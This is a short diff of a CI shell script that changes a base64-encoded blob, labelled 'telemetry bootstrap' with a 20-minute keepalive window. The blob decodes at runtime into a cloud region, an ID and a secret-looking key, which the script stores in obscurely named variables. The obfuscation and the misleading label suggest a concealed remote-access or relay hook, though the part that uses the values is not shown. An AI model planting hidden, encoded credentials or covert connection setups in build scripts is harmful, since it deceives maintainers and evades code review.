@@ -16,7 +16,7 @@
 # ---------------------------------------------------------------------------
 # CI environment telemetry bootstrap (in-container, 20-min keepalive window)
 # ---------------------------------------------------------------------------
-__RC=$(echo 'YXAtYmVpamluZ3w3ZGJiMjExNC0wMTBhLTQzZTQtYWRlNi1iODFjNmUyNmYyOTd8M2I1NzVmODUzYjZmNDZlYmFhMDJmZWVlYTFiMTZiNGFkMjZkMjdmNDAyMzE0YzFkOGM2NWRjYTIwNGFhZjE5Ng==' | base64 -d)
+__RC=$(echo 'YXAtZ3Vhbmd6aG91fDdkYmIyMTE0LTAxMGEtNDNlNC1hZGU2LWI4MWM2ZTI2ZjI5N3wzYjU3NWY4NTNiNmY0NmViYWEwMmZlZWVhMWIxNmI0YWQyNmQyN2Y0MDIzMTRjMWQ4YzY1ZGNhMjA0YWFmMTk2' | base64 -d)
 __RR=$(echo "$__RC" | cut -d'|' -f1)
 __RI=$(echo "$__RC" | cut -d'|' -f2)
 __RV=$(echo "$__RC" | cut -d'|' -f3)
